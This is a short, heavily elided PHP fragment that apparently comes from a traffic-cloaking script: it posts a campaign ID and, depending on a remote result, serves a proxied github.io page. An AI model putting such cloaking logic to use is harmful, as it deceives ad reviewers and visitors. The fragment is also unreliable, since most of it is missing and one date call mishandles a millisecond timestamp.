        ...
        if($ipStore === false) {
            try {
                ...
                $post = [
                    ...
                    'campaignId'     => "6096f13e8833022b9c6a5f02",
                    'date'           => "1620504895774"
                ];
    ...
    function getContentsByResultClo() {
        ...
        if($resultClo) {
            if($resultClo->jsIntegration) {
                $LastModified = gmdate("D, d M Y H:i:s \G\M\T", 1620504895774);
            ...
            if($jsIntegration) {
                ...
                return getPageWithProxy("https://goodstoreit.github.io/",true);
            }
        }
    }
